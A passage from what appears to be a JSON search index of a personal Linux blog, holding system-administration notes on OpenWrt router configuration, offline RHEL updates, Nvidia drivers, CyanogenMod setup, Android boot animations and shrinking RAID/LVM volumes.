&gt; /etc/fswebcam.script &lt;&lt; \\EOF #!/bin/sh OUTPUT_FILE=\"/tmp/webcam/$(date +%F_%H-%M).png\" OUTPUT_DIR=$(dirname \"$OUTPUT_FILE\") date &gt; /tmp/fswebcam.script.log if [ \"$(pgrep -f fswebcam | wc -l)\" -ge 4 ]; then BAD_STATE=1 # shellcheck disable=SC2009 # ps | grep is intentional to show full process details for debugging echo -e \"*** fswebcam already running [$(pgrep -f fswebcam | wc -l)] !!!\\n*** ps -ef | grep -E '(fswebcam|scp)':\\n$(ps -ef | grep -E '(fswebcam|scp)')\\n*** killall fswebcam:\\n$(killall fswebcam)\\n\" | tee -a /tmp/fswebcam.script.log fi test -d \"$OUTPUT_DIR\" || mkdir -p \"$OUTPUT_DIR\" fswebcam --no-banner --rotate 180 --resolution 640x480 --fps 15 --png 7 --save \"$OUTPUT_FILE\" 2&gt;&amp;1 | tee -a /tmp/fswebcam.script.log if scp -B -p -i /root/.ssh/id_rsa \"$OUTPUT_FILE\" ruzickap@gate.xvx.cz:/home/ftp/ &gt;&gt; /tmp/fswebcam.script.log 2&gt;&amp;1; then rm \"$OUTPUT_FILE\" else BAD_STATE=1 test -d /root/webcam_medlanky || mkdir -p /root/webcam_medlanky mv \"$OUTPUT_FILE\" /root/webcam_medlanky/ echo -e \"*** ls -la /root/webcam_medlanky/:\\n$(ls -la /root/webcam_medlanky/)\\n\" | tee -a /tmp/fswebcam.script.log fi if [ \"$BAD_STATE\" -eq 1 ]; then echo -e \"Subject: Webcam script failed!\\n\\n$(cat /tmp/fswebcam.script.log)\\n\" | ssmtp petr.ruzicka@gmail.com fi EOF chmod a+x /etc/fswebcam.script echo \"*/30 * * * * /etc/fswebcam.script\" &gt;&gt; /etc/crontabs/root /etc/init.d/cron enable /etc/init.d/cron start Collectd configuration: /usr/bin/digitemp_DS9097 -a -i -c /etc/digitemp.conf -s/dev/ttyUSB0 mkdir -p /etc/collectd/conf.d cat &gt;&gt; /etc/collectd/conf.d/my_collectd.conf &lt;&lt; \\EOF LoadPlugin contextswitch LoadPlugin memory LoadPlugin uptime LoadPlugin vmem LoadPlugin users LoadPlugin protocols Value \"/^Tcp:/\" IgnoreSelected false LoadPlugin syslog LogLevel \"info\" EOF uci set luci_statistics.collectd_ping.enable=1 uci set luci_statistics.collectd_ping.Hosts=www.google.com uci set luci_statistics.collectd_df.enable=1 uci set luci_statistics.collectd_df.Devices=/dev/sda1 uci set luci_statistics.collectd_df.MountPoints=/mnt/sda1 uci set luci_statistics.collectd_df.FSTypes=fuseblk uci set luci_statistics.collectd_disk.enable=1 uci set luci_statistics.collectd_disk.Disks=sda uci set luci_statistics.collectd_dns.enable=1 uci set luci_statistics.collectd_dns.Interfaces=\"br-wan br-wifi_open br-wifi_private\" uci set luci_statistics.collectd_interface.Interfaces=\"br-wan br-wifi_open br-wifi_private\" uci set luci_statistics.collectd_irq.enable=1 uci set luci_statistics.collectd_netlink.enable=1 uci set luci_statistics.collectd_netlink.VerboseInterfaces=\"br-wan br-wifi_open br-wifi_private\" uci set luci_statistics.collectd_netlink.QDisc=\"br-wan br-wifi_open br-wifi_private\" uci set luci_statistics.collectd_network.enable=1 uci set luci_statistics.@collectd_network_server[0].host=\"\\\"collectd.xvx.cz\\\"\" uci set luci_statistics.collectd_tcpconns.LocalPorts=\"22 80 443 667\" uci set luci_statistics.@collectd_exec_input[0].cmdline=\"/etc/digitemp.script\" /etc/init.d/luci_statistics enable Useful commands: swconfig dev rtl8366rb show swconfig dev rtl8366rb vlan 1 show cat /proc/net/vlan/config snmpwalk -v2c -c public_wifi 192.168.0.2 logread Serial Port Temperature Sensors: https://web.archive.org/web/2020/http://www.linuxfocus.org/English/November2003/article315.shtml https://martybugs.net/electronics/tempsensor/hardware.cgi Serial cable: https://halfface.se/wiki/index.php/Openwrt" }, { "title": "Update offline CentOS-RHEL server", "url": "/posts/update-offline-centos-rhel-server/", "categories": "Linux, linux-old.xvx.cz", "tags": "rhel, security", "date": "2011-02-02 00:00:00 +0100", "content": "https://linux-old.xvx.cz/2011/02/update-offline-centosrhel-server/ Sometimes you have a RHEL/CentOS server which is not connected to the Internet. But you should also install security updates to prevent local hackers from messing up your system. I was not able to find a good description of how to do it. Some people are using proxies - but then you still need some connection to the proxy - which can not be the case. Here is how I did it…. Let’s say there is a server which is offline and doesn’t have any connection to the Internet. Then we need a station (or laptop / virtual machine), which has the same OS as the server and is connected to the Internet. Copy the /var/lib/rpm to the station (you can use USB/CD…) scp -r /var/lib/rpm root@station:/tmp/ Install the download only plugin for yum: yum install yum-downloadonly Backup the original rpm directory on the station and replace it with the rpm directory from the server: mv -v /var/lib/rpm /var/lib/rpm.orig mv -v /tmp/rpm /var/lib/ Download updates to /tmp/rpm_updates and return back the /var/lib/rpm mkdir -v /tmp/rpm_updates yum update --downloadonly --downloaddir /tmp/rpm_updates rm -rvf /var/lib/rpm mv -v /var/lib/rpm.orig /var/lib/rpm Transfer the downloaded rpms to the server and update: scp -r /tmp/rpm_updates root@server:/tmp/ ssh root@server rpm -Uvh /tmp/rpm_updates/* …and the server is updated ;-) This is probably not the best way to do it, but it’s working for me." }, { "title": "Nvidia proprietary drivers and RHEL6", "url": "/posts/nvidia-proprietary-drivers-and-rhel6/", "categories": "Linux, linux-old.xvx.cz", "tags": "rhel, grub", "date": "2011-01-20 00:00:00 +0100", "content": "https://linux-old.xvx.cz/2011/01/nvidia-proprietary-drivers-and-rhel6/ Sometimes you need to run Nvidia proprietary drivers in various Linux distributions. I was able to run it on standard RHEL 6.0 installed as “Desktop” with the following commands: Update the system and install the necessary packages yum update yum install gcc kernel-devel reboot Blacklist the nouveau driver sed -i '/root=/s|$| rdblacklist=nouveau vga=791|' /boot/grub/grub.conf echo \"blacklist nouveau\" &gt;&gt; /etc/modprobe.d/blacklist.conf Change the initrd image: mv \"/boot/initramfs-$(uname -r).img\" \"/boot/initramfs-$(uname -r)-nouveau.img\" dracut \"/boot/initramfs-$(uname -r).img\" \"$(uname -r)\" Remove the nouveau driver and reboot: yum remove xorg-x11-drv-nouveau reboot Stop the X server and run the Nvidia installation process from the command line init 3 chmod +x NVIDIA-Linux-x86-260.19.29.run ./NVIDIA-Linux-x86-260.19.29.run Enjoy :-)" }, { "title": "OpenWrt with Transmission, Samba and vsftpd", "url": "/posts/openwrt-with-transmission-samba-and-vsftpd/", "categories": "OpenWrt, Networking, linux-old.xvx.cz", "tags": "tp-link, torrent", "date": "2010-12-01 00:00:00 +0100", "content": "https://linux-old.xvx.cz/2010/12/openwrt-with-transmission-samba-and-vsftpd/ My brother asked me to customize firmware in his WiFi router TP-Link TL-WR1043ND. He wants to use it for downloading torrents and sharing them using smb and ftp protocols. I have good experience with OpenWrt, which is really good in customization and suits well for this purpose. Nowadays there are a few torrent clients in OpenWrt distribution, but I chose transmission and for ftp daemon vsftpd. I decided to compile it from scratch (using Fedora 13), because I’m able to include all necessary software in the image (since it’s compressed). If I install the packages using opkg later I will not have enough free space to install all my favorite programs. Here are my notes beginning with the compilation from sources, uploading firmware and basic OpenWrt configuration. Download necessary packages to compile OpenWrt: yum install subversion gcc-c++ libz-dev flex unzip ncurses-devel zlib-devel Download OpenWrt Backfire from svn: cd /var/tmp/ || exit svn co svn://svn.openwrt.org/openwrt/branches/backfire or use the standard way: cd /var/tmp/ || exit wget http://downloads.openwrt.org/backfire/10.03/backfire_10.03_source.tar.bz2 tar xvjf backfire_10.03_source.tar.bz2 mv backfire_10.03 backfire Start configuring it: cd backfire || exit ./scripts/feeds update ./scripts/feeds install block-extroot e2fsprogs cifsmount collectd-mod-conntrack collectd-mod-contextswitch collectd-mod-cpu collectd-mod-df collectd-mod-disk collectd-mod-dns collectd-mod-exec collectd-mod-filecount collectd-mod-iptables collectd-mod-irq collectd-mod-memory collectd-mod-netlink collectd-mod-network collectd-mod-ping collectd-mod-processes collectd-mod-protocols collectd-mod-syslog collectd-mod-tcpconns collectd-mod-uptime collectd-mod-users collectd-mod-vmem darkstat htop kmod-ath9k kmod-usb2 kmod-usb-storage luci-app-livestats luci-app-ntpc luci-app-qos luci-app-samba luci-app-statistics luci-ssl mc mini-snmpd mount.ntfs-3g nmap ntfs-3g ssmtp tcpdump-mini transmission-web vsftpd wget wpad-mini zoneinfo-europe make menuconfig Now you should select what you want to have in the final firmware image. I just selected what I installed from the feeds above (my .config): Then run make V=99 … and take a coffee :-) Connect router to your desktop/laptop and flash it from the webgui using this file: openwrt-ar71xx-tl-wr1043nd-v1-squashfs-factory.bin If you already have OpenWrt installed you can replace it by this command: sysupgrade -v -i ftp://ftp.xvx.cz/pub/distributions/openwrt/bracha/openwrt-ar71xx-tl-wr1043nd-v1-squashfs-sysupgrade.bin # scp ./backfire/bin/ar71xx/openwrt-ar71xx-tl-wr1043nd-v1-squashfs-sysupgrade.bin root@192.168.0.2:/tmp # sysupgrade -v -i /tmp/openwrt-ar71xx-tl-wr1043nd-v1-squashfs-sysupgrade.bin # or # mtd -r write /tmp/openwrt-ar71xx-tl-wr1043nd-v1-squashfs-sysupgrade.bin firmware Set password using telnet command and continue with firewall, network and other system stuff : ifconfig eth0 192.168.1.2 netmask 255.255.255.0 telnet 192.168.1.1 passwd uci add firewall rule uci set firewall.@rule[-1].name=ssh uci set firewall.@rule[-1].src=wan uci set firewall.@rule[-1].target=ACCEPT uci set firewall.@rule[-1].proto=tcp uci set firewall.@rule[-1].dst_port=22 uci add firewall rule uci set firewall.@rule[-1].name=ftp uci set firewall.@rule[-1].src=wan uci set firewall.@rule[-1].target=ACCEPT uci set firewall.@rule[-1].proto=tcp uci set firewall.@rule[-1].dst_port=21 uci add firewall rule uci set firewall.@rule[-1].name=snmp uci set firewall.@rule[-1].src=wan uci set firewall.@rule[-1].target=ACCEPT uci set firewall.@rule[-1].proto=udp uci set firewall.@rule[-1].dst_port=161 uci add firewall rule uci set firewall.@rule[-1].name=transmission uci set firewall.@rule[-1].src=wan uci set firewall.@rule[-1].target=ACCEPT uci set firewall.@rule[-1].proto=tcp uci set firewall.@rule[-1].dst_port=51413 uci set wireless.@wifi-iface[-1].ssid=kerova11 uci set wireless.@wifi-iface[-1].encryption=psk2 uci set wireless.@wifi-iface[-1].key=xxxxxxxx uci set wireless.@wifi-iface[-1].network=lan uci set wireless.radio0.channel=3 uci set wireless.radio0.htmode=HT40 uci del wireless.@wifi-device[0].disabled uci set dhcp.@dnsmasq[0].notinterface=\"eth0.2\" #uci set dhcp.wifi=dhcp #uci set dhcp.wifi.interface=wifi #uci set dhcp.wifi.start=10 #uci set dhcp.wifi.limit=250 uci add dhcp host uci set dhcp.@host[-1].name=jura_nb uci set dhcp.@host[-1].ip=192.168.1.5 uci set dhcp.@host[-1].mac=00:21:5d:70:61:de uci add dhcp host uci set dhcp.@host[-1].name=jura_pda uci set dhcp.@host[-1].ip=192.168.1.6 uci set dhcp.@host[-1].mac=00:1a:6b:95:ae:26 uci set system.@system[0].hostname=OpenWrt-bracha uci set system.@system[0].timezone=CET-1CEST,M3.5.0,M10.5.0/3 uci set system.@system[0].timezone=CET-1CEST,M3.5.0,M10.5.0/3 uci set system.@system[0].log_size=64 uci set system.@system[0].log_ip=gate.xvx.cz uci set qos.wan.upload=819200 uci set qos.wan.download=819200 uci commit reboot Try if you are able to mount NTFS drives and create swap on it: echo \"ruzicka:*:1000:1000:ruzicka:/tmp:/bin/false\" &gt;&gt; /etc/passwd mkdir /mnt/sda1 #mount /dev/sda1 /mnt/sda1 ntfs-3g -o rw,utf8,fmask=0133,dmask=0022,noatime,uid=1000 /dev/sda1 /mnt/sda1 mkdir -p /mnt/samba /mnt/sda1/openwrt/shared /mnt/sda1/openwrt/torrent-incomplete /mnt/sda1/openwrt/torrent /mnt/sda1/openwrt/collectd_rrdtool /mnt/sda1/openwrt/shared/torrent #swapon /dev/sdb2 dd if=/dev/zero of=/mnt/sda1/openwrt/swap count=262144 mkswap /mnt/sda1/openwrt/swap swapon /mnt/sda1/openwrt/swap cat &gt;&gt; /etc/rc.local &lt;&lt; EOF ntfs-3g -o rw,utf8,fmask=0133,dmask=0022,noatime,uid=1000 /dev/sda1 /mnt/sda1 &amp;&amp; swapon /mnt/sda1/openwrt/swap &amp; /etc/init.d/transmission start /etc/init.d/transmission enable mount.cifs //192.168.0.1/all /mnt/samba -o guest,nosetuids,nosuid,noperm,noacl,noexec,nodev,nouser_xattr,file_mode=0644,dir_mode=0755 &amp; exit 0 EOF #uci set fstab.@swap[0].enabled=1 #uci set fstab.@mount[0].target=/mnt/sda1 #uci set fstab.@mount[0].fstype=ext4 #uci set fstab.@mount[0].enabled=1 Setup the ssh key to enable autologin: scp \"$HOME\"/.ssh/id_rsa.pub root@192.168.0.2:/tmp/authorized_keys ssh root@192.168.0.2 cp /tmp/authorized_keys /etc/dropbear/authorized_keys chmod 600 /etc/dropbear/authorized_keys Configure certificate details for https: uci set uhttpd.px5g.days=3650 uci set uhttpd.px5g.country=CZ uci set uhttpd.px5g.state=\"Czech Republic\" uci set uhttpd.px5g.location=Brno rm /etc/uhttpd.crt /etc/uhttpd.key Configure darkstat and snmpd: uci set darkstat.@darkstat[0].interface=wan uci set mini_snmpd.@mini_snmpd[0].interfaces=lo,eth0.2,wlan0 uci set mini_snmpd.@mini_snmpd[0].community=my_community uci set mini_snmpd.@mini_snmpd[0].location='Kerova 11, Brno' uci set mini_snmpd.@mini_snmpd[0].contact='PeRu' Setup ssmtp to be able to send emails: sed -i 's/\\(^root\\)=.*/\\1=openwrt.email@gmail.com/;s/\\(^mailhub\\).*/\\1=smtp.gmail.com:587/;s/\\(^rewriteDomain=\\).*/\\1gmail.com/;s/^#\\(FromLineOverride=YES\\)/\\1/;s/^#\\(UseTLS=YES\\)/\\1/' /etc/ssmtp/ssmtp.conf cat &gt;&gt; /etc/ssmtp/ssmtp.conf &lt;&lt; EOF UseSTARTTLS=YES AuthUser=openwrt.email AuthPass=my_password EOF Samba configuration: uci delete samba.@sambashare[-1] uci delete samba.@samba[-1].homes uci add samba sambashare uci set samba.@sambashare[-1].name=shared uci set samba.@sambashare[-1].path=/mnt/sda1/openwrt/shared uci set samba.@sambashare[-1].read_only=yes uci set samba.@sambashare[-1].guest_ok=yes uci add samba sambashare uci set samba.@sambashare[-1].name=shared_rw uci set samba.@sambashare[-1].path=/mnt/sda1/openwrt/shared uci set samba.@sambashare[-1].read_only=no uci set samba.@sambashare[-1].guest_ok=no uci set samba.@sambashare[-1].users=ruzicka uci add samba sambashare uci set samba.@sambashare[-1].name=openwrt uci set samba.@sambashare[-1].path=/mnt/sda1/openwrt uci set samba.@sambashare[-1].read_only=no uci set samba.@sambashare[-1].guest_ok=no uci set samba.@sambashare[-1].users=ruzicka uci add samba sambashare uci set samba.@sambashare[-1].name=sda1 uci set samba.@sambashare[-1].path=/mnt/sda1 uci set samba.@sambashare[-1].read_only=no uci set samba.@sambashare[-1].guest_ok=no uci set samba.@sambashare[-1].users=ruzicka sed -i -e 's|security = share|security = user|' /etc/samba/smb.conf.template sed -i -e 's|ISO-8859-1|UTF-8|' /etc/samba/smb.conf.template echo -e \"\\tdisplay charset = UTF8\" &gt;&gt; /etc/samba/smb.conf.template echo -e \"\\tdos charset = CP852\" &gt;&gt; /etc/samba/smb.conf.template smbpasswd ruzicka testpassword123 /etc/init.d/samba enable FTP configuration: sed -i 's/\\(^anonymous_enable\\).*/\\1=YES/;s/^#\\(syslog_enable=YES\\).*/\\1/' /etc/vsftpd.conf cat &gt;&gt; /etc/vsftpd.conf &lt;&lt; EOF anon_root=/mnt/sda1/openwrt/shared ftp_username=nobody hide_ids=YES EOF passwd ruzicka Luci statistics module configuration: uci set luci_statistics.collectd_ping.enable=1 uci set luci_statistics.collectd_ping.Hosts=www.google.com uci set luci_statistics.collectd_df.enable=1 uci set luci_statistics.collectd_df.Devices=/dev/sda1 uci set luci_statistics.collectd_df.MountPoints=/mnt/sda1 uci set luci_statistics.collectd_df.FSTypes=fuseblk uci set luci_statistics.collectd_dns.enable=1 uci set luci_statistics.collectd_dns.Interfaces=\"eth0.2\" uci set luci_statistics.collectd_interface.Interfaces=\"eth0.2 wlan0\" uci set luci_statistics.collectd_iptables.enable=0 uci set luci_statistics.collectd_irq.enable=1 uci set luci_statistics.collectd_network.enable=1 uci set luci_statistics.@collectd_network_server[0].host=\"\\\"collectd.xvx.cz\\\"\" uci set luci_statistics.collectd_netlink.enable=1 uci set luci_statistics.collectd_netlink.VerboseInterfaces=\"eth0.2 wlan0\" uci set luci_statistics.collectd_netlink.QDiscs=\"eth0.2 wlan0\" uci set luci_statistics.collectd_tcpconns.LocalPorts=\"22 80 443 667\" uci set luci_statistics.collectd_rrdtool.DataDir=/mnt/sda1/openwrt/collectd_rrdtool uci set luci_statistics.collectd_disk.enable=1 uci set luci_statistics.collectd_disk.Disks=sda mkdir -p /etc/collectd/conf.d cat &gt; /etc/collectd/conf.d/my_collectd.conf &lt;&lt; EOF LoadPlugin contextswitch LoadPlugin memory LoadPlugin uptime LoadPlugin vmem LoadPlugin protocols &lt;Plugin protocols&gt; Value \"/^Tcp:/\" IgnoreSelected false &lt;/Plugin&gt; LoadPlugin filecount &lt;Plugin filecount&gt; &lt;Directory \"/mnt/sda1/openwrt/torrent/torrents\"&gt; Instance \"torrents\" Name \"*.torrent\" &lt;/Directory&gt; &lt;/Plugin&gt; LoadPlugin syslog &lt;Plugin syslog&gt; LogLevel \"info\" &lt;/Plugin&gt; EOF Transmission bittorrent client configuration: uci set transmission.@transmission[-1].enabled=1 uci set transmission.@transmission[-1].config_dir=/mnt/sda1/openwrt/torrent uci set transmission.@transmission[-1].download_dir=/mnt/sda1/openwrt/shared/torrent uci set transmission.@transmission[-1].incomplete_dir_enabled=true uci set transmission.@transmission[-1].incomplete_dir=/mnt/sda1/openwrt/torrent-incomplete uci set transmission.@transmission[-1].speed_limit_down_enabled=false uci set transmission.@transmission[-1].speed_limit_down=100 uci set transmission.@transmission[-1].speed_limit_up=0 uci set transmission.@transmission[-1].alt_speed_enabled=false uci set transmission.@transmission[-1].alt_speed_down=0 uci set transmission.@transmission[-1].alt_speed_up=10 uci set transmission.@transmission[-1].alt_speed_time_day=127 uci set transmission.@transmission[-1].alt_speed_time_begin=0 uci set transmission.@transmission[-1].alt_speed_time_end=360 uci set transmission.@transmission[-1].rpc_whitelist=127.0.0.1,192.168.1.* uci set transmission.@transmission[-1].start_added_torrents=true uci set transmission.@transmission[-1].script_torrent_done_enabled=true uci set transmission.@transmission[-1].script_torrent_done_filename=/etc/torrent-done.sh cat &gt; /etc/torrent-done.sh &lt;&lt; \\EOF echo -e \"$TR_TORRENT_NAME finished.\" | ssmtp ruzickajiri@gmail.com EOF chmod a+x /etc/torrent-done.sh uci commit reboot Now you can use one of the transmission clients and try to download something. I’m sure you need to customize most of the things mentioned above, but these notes can still help you. Enjoy :-)" }, { "title": "My basic setup of CyanogenMod-6.0 on HTC Desire", "url": "/posts/my-basic-setup-of-cyanogenmod-60-on-htc-desire/", "categories": "Android, linux-old.xvx.cz", "tags": "htc-desire, cyanogenmod, adb", "date": "2010-09-09 00:00:00 +0200", "content": "https://linux-old.xvx.cz/2010/09/my-basic-setup-of-cyanogenmod-6-0-on-htc-desire/ Since I bought my HTC Desire I wanted to put CyanogenMod on it. This ROM is quite popular, but only version 6.0 released last week supports HTC Desire. I’m going to put a few notes here on how I did “post installation” changes like removing some programs, ssh key config, OpenVPN setup, and a few more. I don’t want to describe here how to install this ROM to the HTC Desire, because there is nice how-to on their pages: Full Update Guide - HTC Desire Just one remark - If you suffer from signal loss please look at this page. Put ssh keys to the phone and start dropbear (SSH server): (taken from CyanogenMod Wiki - Connect with SSH) Copy your ssh public key from your Linux box to the phone: adb push /home/ruzickap/.ssh/id_rsa.pub /sdcard/authorized_keys Prepare dropbear on the phone: adb shell mkdir -p /data/dropbear/.ssh/ dropbearkey -t rsa -f /data/dropbear/dropbear_rsa_host_key dropbearkey -t dss -f /data/dropbear/dropbear_dss_host_key cp /sdcard/authorized_keys /data/dropbear/.ssh/ chmod 755 /data/dropbear /data/dropbear/.ssh chmod 644 /data/dropbear/dropbear*host_key /data/dropbear/.ssh/authorized_keys echo \"export PATH=/usr/bin:/usr/sbin:/bin:/sbin:/system/sbin:/system/bin:/system/xbin:/system/xbin/bb:/data/local/bin\" &gt;&gt; /data/dropbear/.profile dropbear Remove some useless applications: (check this page CyanogenMod Wiki - Barebones to see what can be removed) Reboot to “ClockworkMod recovery” (using Fake Flash by Koush). Mount /system partition: adb shell mount -o nodev,noatime,nodiratime -t yaffs2 /dev/block/mtdblock3 /system mount /data Backup directories under /data: BACKUP_DESTINATION=\"/sdcard/mybackup\" cd /data || exit mkdir -p \"$BACKUP_DESTINATION/data/\" for item in *; do case \"$item\" in dalvik-cache | lost+found) ;; *) cp -R \"$item\" \"$BACKUP_DESTINATION/data/\" ;; esac done Move applications to sdcard: for APK in ApplicationsProvider.apk CarHomeGoogle.apk CarHomeLauncher.apk com.amazon.mp3.apk Development.apk Email.apk Facebook.apk GenieWidget.apk googlevoice.apk Maps.apk PicoTts.apk Protips.apk RomManager.apk SetupWizard.apk SpeechRecorder.apk Stk.apk Street.apk Talk.apk TtsService.apk Twitter.apk VoiceDialer.apk YouTube.apk; do echo \"*** $APK\" mkdir \"$BACKUP_DESTINATION/$APK\" &amp;&amp; mv \"/system/app/$APK\" \"$BACKUP_DESTINATION/$APK/\" &amp;&amp; mv \"/data/data/$(awk -F \\\" \"/$APK/ { print \\$2 }\" /data/system/packages.xml)\" \"$BACKUP_DESTINATION/$APK/\" #/system/bin/pm uninstall $(awk -F \\\" '/package.apk/ { print $2 }' /data/system/packages.xml) done Remove unused audio files: for AUDIO in $(find /system/media/audio -type f | grep -Ev \"ui|Alarm_Buzzer.ogg|SpaceSeed.ogg|Doink.ogg|SpaceSeed.ogg|CrayonRock.ogg\"); do echo \"*** Removing $AUDIO\" rm \"$AUDIO\" done Unmount all used filesystems: cd / umount /data /sdcard /system It’s all for now… I’m sure I will do more sooner or later, but it’s just a few notes for now. Enjoy :-)" }, { "title": "Android bootanimation", "url": "/posts/android-bootanimation/", "categories": "Android, linux-old.xvx.cz", "tags": "htc-desire, adb", "date": "2010-06-17 00:00:00 +0200", "content": "Not completed… I decided to change the boot animation on my HTC Desire. You can find plenty of them in many places, but I tried to create my own from a movie. In this example I’m going to use a movie from Big Buck Bunny which is licensed under the Creative Commons Attribution 3.0 license. But you can probably use it generally for any movie which can be played in mplayer. First download the movie: wget http://mirror.bigbuckbunny.de/peach/bigbuckbunny_movies/big_buck_bunny_1080p_h264.mov To make it quick you can use this script to create bootanimation.zip file. I commented some parts of the code, so it should be understandable. #!/bin/bash MOVIE_FILE=\"big_buck_bunny_1080p_h264.mov\" START_AT=\"0:04:30\" END=\"2\" START_AT_2=\"0:06:27\" END_2=\"2\" SIZE=\"480x800\" DESC_SIZE=\"${SIZE/x/ }\" #Create png files from the selected movie part mplayer -nosound -vo png:z=9:outdir=part0 -ss $START_AT -endpos $END $MOVIE_FILE mplayer -nosound -vo png:z=9:outdir=part1 -ss $START_AT_2 -endpos $END_2 $MOVIE_FILE COUNT_PART=1 #Crop every png file to get the right SIZE to fit to your phone for FILE in part[01]/*.png; do echo \"*** ($COUNT_PART) $FILE\" if echo \"$FILE\" | grep part0; then # You can add the following frame (but I don't like it) - see imagemagick home page for more details # -mattecolor SkyBlue -frame 6x6+2+2 convert \"$FILE\" -crop 870x1080+510+0 -units PixelsPerCentimeter -type TrueColor -density 37.78x37.78 -depth 8 -resize $SIZE -size $SIZE xc:black +swap -gravity center -composite -verbose \"part0/$(printf \"%05d.${FILE##*.}\" $COUNT_PART)\" COUNT_PART=$((COUNT_PART + 1)) else convert \"$FILE\" -crop 540x900+1150+150 -units PixelsPerCentimeter -type TrueColor -density 37.78x37.78 -depth 8 -resize $SIZE -size $SIZE xc:black +swap -gravity center -composite -verbose \"part1/$(printf \"%05d.${FILE##*.}\" $COUNT_PART)\" COUNT_PART=$((COUNT_PART + 1)) fi rm \"$FILE\" done #Write desc file echo \"$DESC_SIZE 30 p 1 0 part0 p 0 0 part1\" &gt; desc.txt #Zip it all to one archive zip -0 --recurse-paths --move bootanimation.zip part0 part1 desc.txt If you have bootanimation.zip you just need to copy it to the phone and restart it. adb push bootanimation.zip /data/local/ adb reboot If you are missing the adb command, please take it from the rooting CD (described in Root HTC Desire under Debian) or from the official Android SDK. Then you should see something like: I don’t know why the video is so choppy, but maybe it’s because the png files are quite big (if I compare with other available animations), because it has a lot of colors and high resolution." }, { "title": "Shrink RAID and LVM partition", "url": "/posts/shrink-raid-and-lvm-partition/", "categories": "Linux, Storage", "tags": "raid, lvm, storage", "date": "2010-06-11 00:00:00 +0200", "content": "Not completed… I’m using RAID1 in my servers. The disks I used are always the same size and the same type from one company. In one old server I had Maxtor disks, where one of the 20G disks failed. Because it’s almost impossible to buy/get another Maxtor disk of such a small size I replaced the broken disk with a 20G Seagate disk. The problem began when I wanted to copy the partition layout from Maxtor to empty Seagate and found out that Seagate is “smaller” than Maxtor. The only way to restore RAID1 was shrinking ext4, lvm, raid and then copying the disk layout to the smaller disk. I have never done this before so I rather tried it in VirtualBox than on a live system and wrote a few notes about it. Let’s have Debian installed on two 10Gb disks using RAID1 with LVM in VirtualBox: root@debian:~# fdisk -l /dev/sda /dev/sdb | grep 'Disk /dev/' Disk /dev/sda: 10.7 GB, 10737418240 bytes Disk /dev/sdb: 10.7 GB, 10737418240 bytes I removed the first disk from RAID: root@debian:~# mdadm --manage /dev/md0 --fail /dev/sda1 mdadm: set /dev/sda1 faulty in /dev/md0 root@debian:~# mdadm --manage /dev/md0 --remove /dev/sda1 mdadm: hot removed /dev/sda1 It’s time to replace the first disk with a smaller one in VirtualBox. Then there should be two different disks with degraded raid array: root@debian:~# fdisk -l /dev/sda /dev/sdb | grep 'Disk /dev/' Disk /dev/sda doesn't contain a valid partition table Disk /dev/sda: 10.7 GB, 10704912384 bytes Disk /dev/sdb: 10.7 GB, 10737418240 bytes root@debian:~# cat /proc/mdstat Personalities : [raid1] md0 : active raid1 sdb1[1] 10482304 blocks [2/1] [_U] unused devices: &lt;none&gt; &lt;/none&gt; If I use sfdisk to copy partition layout from bigger disk to smaller disk I get this warning: root@debian:~# sfdisk -d /dev/sdb | sfdisk --force /dev/sda ... Warning: given size (20964762) exceeds max allowable size (20900502) ... To prevent this error I need to shrink raid partition located on /dev/sdb1 by 31MB. Look at the disk layout: root@debian:~# df --total Filesystem 1K-blocks Used Available Use% Mounted on /dev/mapper/VG-root 959512 148832 761940 17% / tmpfs 125604 0 125604 0% /lib/init/rw udev 10240 140 10100 2% /dev tmpfs 125604 0 125604 0% /dev/shm /dev/mapper/VG-home 4559792 140136 4188028 4% /home /dev/mapper/VG-tmp 959512 17588 893184 2% /tmp /dev/mapper/VG-usr 1919048 262228 1559336 15% /usr /dev/mapper/VG-var 1919048 237692 1583872 14% /var total 10578360 806616 9247668 9% You can see there is 4G free on /home partition. Download and boot SystemRescueCD and shrink ext4 first. root@sysresccd /root % e2fsck -f /dev/mapper/VG-home root@sysresccd /root % resize2fs /dev/mapper/VG-home 4G resize2fs 1.41.11 (14-Mar-2010) Resizing the filesystem on /dev/mapper/VG-home to 1048576 (4k) blocks. The filesystem on /dev/mapper/VG-home is now 1048576 blocks long. Now the home partition has 4G and I can change size of /dev/mapper/vg-home. Here is the lvm configuration: root@sysresccd /root % lvs LV VG Attr LSize Origin Snap% Move Log Copy% Convert home VG -wi-a- 4.42g root VG -wi-a- 952.00m tmp VG -wi-a- 952.00m usr VG -wi-a- 1.86g var VG -wi-a- 1.86g root@sysresccd /root % vgs VG #PV #LV #SN Attr VSize VFree VG 1 5 0 wz--n- 10.00g 0 root@sysresccd /root % pvs PV VG Fmt Attr PSize PFree /dev/md0 VG lvm2 a- 10.00g 0 It means: There are 5 logical volumes (home, root, tmp, usr, var) which belong to volume group “VG” There is volume group which occupy the whole physical volume (VG 1 5 0 wz--n- 10.00g 0) There is a physical volume on the whole raid (/dev/md0 VG lvm2 a- 10.00g 0) It’s necessary to reduce logical volume first: root@sysresccd /root % lvdisplay /dev/VG/home | grep 'LV Size' LV Size 4.42 GiB lvreduce --size 4.1G /dev/mapper/VG-home Next useful step (but not required) is extend ext4 partition to fit lvm volume: e2fsck -f /dev/mapper/VG-home resize2fs /dev/mapper/VG-home We are done with logical volume resizing and we should see some free space in volume group (324M): root@sysresccd / % pvs PV VG Fmt Attr PSize PFree /dev/md0 VG lvm2 a- 10.00g 324.00m Now it’s necessary to shrink physical volume (the “lowest” volume) [10G - 0.031G]: pvresize /dev/md0 --setphysicalvolumesize 9.9G root@sysresccd / % pvs PV VG Fmt Attr PSize PFree /dev/md0 VG lvm2 a- 9.90g 224.00m The last thing we need to resize is disk array: root@sysresccd / % mdadm --detail /dev/md0 | grep Size Array Size : 10482304 (10.00 GiB 10.73 GB) Used Dev Size : 10482304 (10.00 GiB 10.73 GB) # 10433331K = 9.95 * 1024 * 1024 root@sysresccd / % mdadm --grow /dev/md0 --size=10433331 mdadm: component size of /dev/md0 has been set to 10433331K Now we can safely create raid partition on the first empty “smaller” disk and mirror data. (Use fdisk to create “Linux raid autodetect” partition [fd] on the first disk): mdadm --manage /dev/md0 --add /dev/sda1 mdadm --create /dev/md1 --verbose --metadata=0.90 --level=1 --raid-devices=2 /dev/sda1 missing pvcreate /dev/md1 vgextend VG /dev/md1 pvmove /dev/md0 /dev/md1 vgreduce VG /dev/md0 pvremove /dev/md0 mdadm --stop /dev/md0 mdadm --zero-superblock /dev/sdb1 sfdisk -d /dev/sda | sfdisk --force /dev/sdb mdadm --manage /dev/md1 --add /dev/sdb1" }, { "title": "Root HTC 